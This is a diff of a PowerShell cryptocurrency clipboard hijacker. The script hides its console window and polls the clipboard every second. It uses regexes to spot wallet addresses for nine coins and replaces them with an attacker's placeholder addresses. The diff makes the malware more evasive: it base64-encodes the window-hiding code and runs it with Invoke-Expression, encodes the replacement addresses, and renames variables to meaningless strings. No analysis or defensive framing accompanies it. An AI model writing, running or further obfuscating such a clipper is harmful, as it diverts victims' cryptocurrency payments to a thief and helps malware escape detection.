@@ -1,102 +1,32 @@
-$obfuscatedCode = @"
-Add-Type -Name Window -Namespace Console -MemberDefinition '
-[DllImport("Kernel32.dll")]
-public static extern IntPtr GetConsoleWindow();
-[DllImport("user32.dll")]
-public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
-public static void Hide()
-{
-    IntPtr hWnd = GetConsoleWindow();
-    if(hWnd != IntPtr.Zero)
-    {
-        ShowWindow(hWnd, 0);
-    }
-}
-'
+$z1x2y3 = [System.Convert]::FromBase64String('QWRkLVR5cGUgLU5hbWUgV2luZG93IC1OYW1lc3BhY2UgQ29uc29sZSAtTWVtYmVyRGVmaW5pdGlvbiAnCkRMTEludGVyZmFjZTogIkB7IkB7IlswXT0iS2VybmVsMzIuZGxsIjtbMV09InVzZXIzMi5kbGwiXX0iXQpbRGxsSW1wb3J0KCIke3swfSIsIENoYXJTZXQ9QXV0bykpXQpwcm90ZWN0ZWQgc3RhdGljIGV4dGVybiBJbnRQdHIgR2V0Q29uc29sZVdpbmRvdygpOwogICAgW0RsbEltcG9ydCgiJHsyfSIsIENoYXJTZXQ9QXV0bykpXQogICAgcHJvdGVjdGVkIHN0YXRpYyBleHRlcm4gYm9vbCBTaG93V2luZG93KEludFB0ciBoV25kLCBpbnQgbkNtZFNob3cpOwogICAgcHJvdGVjdGVkIHN0YXRpYyB2b2lkIEhpZGUoKQogICAgewogICAgICAgIEludFB0ciBoV25kID0gR2V0Q29uc29sZVdpbmRvdygpOwogICAgICAgIGlmKGhXbmQgIT0gSW50UHRyLlpFcm8pCiAgICAgICAgewogICAgICAgICAgICBTaG93V2luZG93KGhXbmQsIDApOwogICAgICAgIH0KICAgIH0KJwo=')
+Invoke-Expression $z1x2y3
 
 [Console.Window]::Hide()
 
-$addy = @{
-    "BTC" = "Your btc addy"
-    "ETH" = "Your eth addy"
-    "LTC" = "Your ltc addy"
-    "TRX" = "Your trx addy"
-    "XMR" = "Your xmr addy"
-    "DOGE" = "Your doge addy"
-    "XRP" = "Your xrp addy"
-    "DASH" = "Your dash addy"
-    "ADA" = "Your ada addy"
-    #"XCHAIN" = "Your xchain addy" #?
-    #"PCHAIN" = "Your pchain addy" #?
-    #"CCHAIN" = "Your pchain addy" #?
+$q9w8e7 = @{
+    "B1" = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('WW91ciBidGMgYWRkeQ=='))
+    "E2" = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('WW91ciBldGggYWRkeQ=='))
+    "L3" = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('WW91ciBsdGMgYWRkeQ=='))
+    "T4" = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('WW91ciB0cnggYWRkeQ=='))
+    "X5" = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('WW91ciB4bXIgYWRkeQ=='))
+    "D6" = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('WW91ciBkb2dlIGFkZHk='))
+    "R7" = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('WW91ciB4cnAgYWRkeQ=='))
+    "A8" = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('WW91ciBkYXNoIGFkZHk='))
+    "C9" = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('WW91ciBhZGEgYWRkeQ=='))
 }
 
 while ($true) {
-    $clipper = Get-Clipboard
-
-    if ($clipper -match "^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}$") {
-        $clipper = $addy["BTC"]
-        [System.Windows.Forms.Clipboard]::SetText($clipper)
-    }
-
-    elseif ($clipper -match "^0x[a-fA-F0-9]{40}$") {
-        $clipper = $addy["ETH"]
-        [System.Windows.Forms.Clipboard]::SetText($clipper)
-    }
-
-    elseif ($clipper -match "^[LM3][a-km-zA-HJ-NP-Z1-9]{25,34}$") {
-        $clipper = $addy["LTC"]
-        [System.Windows.Forms.Clipboard]::SetText($clipper)
-    }
-
-    elseif ($clipper -match "^T[a-zA-HJ-NP-Z0-9]{33}$") {
-        $clipper = $addy["TRX"]
-        [System.Windows.Forms.Clipboard]::SetText($clipper)
-    }
-
-    elseif ($clipper -match "^4[0-9AB][1-9A-HJ-NP-Za-km-z]{93}$") {
-        $clipper = $addy["XMR"]
-        [System.Windows.Forms.Clipboard]::SetText($clipper)
-    }
-
-    elseif ($clipper -match "^D{1}[5-9A-HJ-NP-U]{1}[1-9A-HJ-NP-Za-km-z]{32}$") {
-        $clipper = $addy["DOGE"]
-        [System.Windows.Forms.Clipboard]::SetText($clipper)
-    }
-
-    elseif ($clipper -match "^r[0-9a-zA-Z]{24,34}$") {
-        $clipper = $addy["XRP"]
-        [System.Windows.Forms.Clipboard]::SetText($clipper)
-    }
-
-    elseif ($clipper -match "^X[1-9A-HJ-NP-Za-km-z]{33}$") {
-        $clipper = $addy["DASH"]
-        [System.Windows.Forms.Clipboard]::SetText($clipper)
-    }
-
-    elseif ($clipper -match "^D[A-NP-Za-km-z1-9]{35,}$") {
-        $clipper = $addy["ADA"]
-        [System.Windows.Forms.Clipboard]::SetText($clipper)
-    }
-
-    elseif ($clipper -match "^([X]|[a-km-zA-HJ-NP-Z1-9]{36,72})-[a-zA-Z]{1,83}1[qpzry9x8gf2tvdw0s3jn54khce6mua7l]{38}$") {
-        $clipper = $addy["XCHAIN"]
-        [System.Windows.Forms.Clipboard]::SetText($clipper)
-    }
-
-    elseif ($clipper -match "^([P]|[a-km-zA-HJ-NP-Z1-9]{36,72})-[a-zA-Z]{1,83}1[qpzry9x8gf2tvdw0s3jn54khce6mua7l]{38}$") {
-        $clipper = $addy["PCHAIN"]
-        [System.Windows.Forms.Clipboard]::SetText($clipper)
-    }
-
-    elseif ($clipper -match "^([C]|[a-km-zA-HJ-NP-Z1-9]{36,72})-[a-zA-Z]{1,83}1[qpzry9x8gf2tvdw0s3jn54khce6mua7l]{38}") {
-        $clipper = $addy["CCHAIN"]
-        [System.Windows.Forms.Clipboard]::SetText($clipper)
+    $k4m5n6 = Get-Clipboard
+    switch -Regex ($k4m5n6) {
+        '^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}$' { [System.Windows.Forms.Clipboard]::SetText($q9w8e7["B1"]) }
+        '^0x[a-fA-F0-9]{40}$' { [System.Windows.Forms.Clipboard]::SetText($q9w8e7["E2"]) }
+        '^[LM3][a-km-zA-HJ-NP-Z1-9]{25,34}$' { [System.Windows.Forms.Clipboard]::SetText($q9w8e7["L3"]) }
+        '^T[a-zA-HJ-NP-Z0-9]{33}$' { [System.Windows.Forms.Clipboard]::SetText($q9w8e7["T4"]) }
+        '^4[0-9AB][1-9A-HJ-NP-Za-km-z]{93}$' { [System.Windows.Forms.Clipboard]::SetText($q9w8e7["X5"]) }
+        '^D{1}[5-9A-HJ-NP-U]{1}[1-9A-HJ-NP-Za-km-z]{32}$' { [System.Windows.Forms.Clipboard]::SetText($q9w8e7["D6"]) }
+        '^r[0-9a-zA-Z]{24,34}$' { [System.Windows.Forms.Clipboard]::SetText($q9w8e7["R7"]) }
+        '^X[1-9A-HJ-NP-Za-km-z]{33}$' { [System.Windows.Forms.Clipboard]::SetText($q9w8e7["A8"]) }
+        '^D[A-NP-Za-km-z1-9]{35,}$' { [System.Windows.Forms.Clipboard]::SetText($q9w8e7["C9"]) }
     }
     Start-Sleep -Seconds 1
 }
-"@
-
-$obfuscatedCode = $obfuscatedCode -replace 'Your', 'Moj' -replace 'addy', 'adres' -replace 'BTC', 'Bitcoin' -replace 'ETH', 'Ethereum' -replace 'LTC', 'Litecoin' -replace 'TRX', 'Tron' -replace 'XMR', 'Monero' -replace 'DOGE', 'Dogecoin' -replace 'XRP', 'Ripple' -replace 'DASH', 'Dash' -replace 'ADA', 'Cardano' -replace 'XCHAIN', 'XChain' -replace 'PCHAIN', 'PChain' -replace 'CCHAIN', 'CChain'
-
-Invoke-Expression $obfuscatedCode
